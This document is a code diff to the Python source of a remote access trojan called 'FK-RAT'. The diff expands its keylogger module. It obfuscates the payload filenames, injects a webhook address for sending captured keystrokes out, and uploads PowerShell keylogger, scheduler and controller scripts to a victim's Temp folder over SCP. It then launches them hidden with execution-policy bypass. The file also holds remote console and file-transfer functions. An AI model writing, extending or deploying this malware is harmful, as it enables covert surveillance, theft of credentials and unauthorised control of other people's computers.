@@ -10,28 +10,27 @@ header = f"{username}@FK-RAT"
 github_path = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/"
 local_path = f"/home/{username}/.FK-RAT" if username != "root" else "/root/.FK-RAT"
 
-
-def randomText():
+# get a random text 
+def randomText(lenght = 8):
     LowerCharacters = "abcdefghijklmnopqrstuvwxyz"
     UpperCharacters = "abcdefghijklmnopqrstuvwxyz".upper()
     chars = LowerCharacters + UpperCharacters
-    randomText = " ".join((ran.choice(chars) for i in range(8)))
+    randomText = " ".join((ran.choice(chars) for i in range(lenght)))
     randomTest = ""
     for char in randomText:
         randomTest += char
     return randomTest.replace(" ", "")
 
-
+# edit a file 
 def editFile(path, line, input):
     f = open(f"{path}", 'r')
     lines = f.readlines()
-    lines[line - 1] = input
+    lines[line - 1] = input + "\n"
     f.close()
 
     f = open(f"{path}", 'w')
     f.writelines(lines)
     f.close()
-
 
 # read config file
 def read_config(config_file):
@@ -55,15 +54,13 @@ def read_config(config_file):
     # return config
     return configuration
 
-
-# Upload File to target with path   (SCP)
+# Upload File to target with path (SCP)
 def remote_upload(upload_file, config, path):
     password = config.get("PASSWORD")
     ip = config.get("IPADDRESS")
     os.system(f"sshpass -p \"{password}\" scp -o StrictHostKeyChecking=accept-new {upload_file} fkrat@{ip}:{path}")
 
-
-# Download File to target with path   (SCP)
+# Download File to target with path (SCP)
 def remote_download(config, path):
     password = config.get("PASSWORD")
     ip = config.get("IPADDRESS")
@@ -73,7 +70,6 @@ def remote_download(config, path):
 
     os.system(
         f"sshpass -p \"{password}\" scp -r -o StrictHostKeyChecking=accept-new fkrat@{ip}:{path} {local_path}/Downloads")
-
 
 # Connects RAT to target        Payload 0
 def remoteConsole(file):
@@ -87,11 +83,9 @@ def remoteConsole(file):
     print(f"[..] Connecting to {file}")
     os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} -o StrictHostKeyChecking=accept-new 'powershell'")
 
-
 # Keylogger which sends to Webhook or downloads to console device
 def keylogger(file):
-    print("Coming soon... ")
-    exit()
+    print("[!!] This tool isn't finished yet")
     config = read_config(file)
     username = config.get("USERNAME")
     password = config.get("PASSWORD")
@@ -114,27 +108,43 @@ def keylogger(file):
     webhook = config.get("KEYLOGGER")
     ## Upload Keylogger
     # file paths
-    keylogger = f"{local_path}/payloads/Keylogger/keylogger.py"
+    keylogger = f"{local_path}/payloads/Keylogger/keylogger.ps1"
+    schedule = f"{local_path}/payloads/Keylogger/schedule.ps1"
+    controller = f"{local_path}/payloads/Keylogger/controller.cmd"
     keylogger_task = f"{local_path}/payloads/Keylogger/keylogger-task.ps1"
+    
     path = f"C:/Users/{username}/Appdata/Local/Temp/{tempdir}"
 
     # obfuscate files
-    obfuscate_keylogger = randomText() + ".py"
-    obfuscate_keylogger_task = randomText() + ".ps1"
+    obfuscate_keylogger = randomText(5) + ".ps1"
+    obfuscate_schedule = randomText(5) + ".ps1"
+    obfuscate_controller = randomText(5) + ".ps1"
+    obfuscate_keylogger_task = randomText(5) + ".ps1"
 
     # file staging
     os.system(f"cp {keylogger} {local_path}/{obfuscate_keylogger}")
+    os.system(f"cp {schedule} {local_path}/{obfuscate_schedule}")
+    os.system(f"cp {controller} {local_path}/{obfuscate_controller}")
     os.system(f"cp {keylogger_task} {local_path}/{obfuscate_keylogger_task}")
 
+    # Edit files (for names and webhook)
+    editFile(f"{local_path}/{obfuscate_keylogger}", 5, f"$Webhook =  \"{webhook.split(' ')[0]}\"")
+    editFile(f"{local_path}/{obfuscate_schedule}", 52, f"            powershell Start-Process powershell.exe -windowstyle hidden \"{path}/{obfuscate_keylogger}\"")
+    editFile(f"{local_path}/{obfuscate_controller}", 2, f"powershell Start-Process powershell.exe -windowstyle hidden \"{path}/{obfuscate_keylogger}\"")
+    editFile(f"{local_path}/{obfuscate_controller}", 3, f"powershell Start-Process powershell.exe -windowstyle hidden \"{path}/{obfuscate_schedule}\"")
 
-    editFile(f"{local_path}/{obfuscate_keylogger}", 12, f"        self.webhook = \"{webhook.split(' ')[0]}\"")
+    # Upload Files to Target
+    remote_upload(f"{local_path}/{obfuscate_keylogger}", config, path)       # Keylogger
+    remote_upload(f"{local_path}/{obfuscate_schedule}", config, path)        # Scheduler
+    remote_upload(f"{local_path}/{obfuscate_controller}", config, path)      # Controller
+    remote_upload(f"{local_path}/{obfuscate_keylogger_task}", config, path)  # Keylogger Task
 
-    #TODO add a new Keylogger which sends to Webhook
 
-    remote_upload(f"{local_path}/{obfuscate_keylogger}", config, path)  # Keylogger
-    remote_upload(f"{local_path}/{obfuscate_keylogger_task}", config, path)
-
+    # Delete staging files  
     os.system(f"rm {local_path}/{obfuscate_keylogger}")
+    os.system(f"rm {local_path}/{obfuscate_schedule}")
+    os.system(f"rm {local_path}/{obfuscate_controller}")
     os.system(f"rm {local_path}/{obfuscate_keylogger_task}")
 
+    # Activate Keylogger
     os.system(f"sshpass -p \"{password}\" ssh fkrat@{ip} 'powershell.exe -windowstyle hidden -ep bypass -File \"C:/Users/{username}/AppData/Local/Temp/{tempdir}/{obfuscate_keylogger_task}\" -ArgumentList {tempdir}'")
